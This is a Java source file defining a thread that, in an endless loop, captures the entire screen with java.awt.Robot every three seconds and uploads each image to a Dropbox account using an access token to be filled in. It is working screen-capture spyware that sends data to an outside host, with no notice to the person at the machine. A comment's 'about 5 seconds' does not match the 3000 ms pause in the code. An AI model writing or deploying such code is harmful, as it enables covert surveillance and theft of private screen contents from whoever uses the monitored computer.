import com.dropbox.core.DbxException;
import com.dropbox.core.DbxRequestConfig;
import com.dropbox.core.v2.DbxClientV2;
import com.dropbox.core.v2.files.UploadErrorException;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.*;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.awt.Robot;

public class MyThread extends Thread {

    public int threadNumber;
    public String ACCESS_TOKEN = ""; // Add your token from Dropbox

    DbxRequestConfig config = DbxRequestConfig.newBuilder("").build(); // Add your path
    DbxClientV2 client = new DbxClientV2(config, ACCESS_TOKEN);

    @Override
    public void run() {
        for (; ; ) {
            System.out.println(threadNumber);


            try {
                Robot robot = new Robot();

                SimpleDateFormat format = new SimpleDateFormat("yyyyMMdd_HHmmss");
                String date = format.format(new Date());

                ByteArrayOutputStream arrayOfBytes = new ByteArrayOutputStream();

                Rectangle capture = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());

                BufferedImage img = robot.createScreenCapture(capture);
                ImageIO.write(img, "png", arrayOfBytes);

                byte[] in = arrayOfBytes.toByteArray();
                InputStream load = new ByteArrayInputStream(in);

                client.files().uploadBuilder("/" + date + ".png").uploadAndFinish(load);

                sleep(3000); // Pause for about 5 seconds
            } catch (FileNotFoundException e) {
                e.printStackTrace();
            } catch (UploadErrorException e) {
                e.printStackTrace();
            } catch (DbxException e) {
                e.printStackTrace();
            } catch (IOException e) {
                e.printStackTrace();
            } catch (AWTException e) {
                e.printStackTrace();
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
    }
}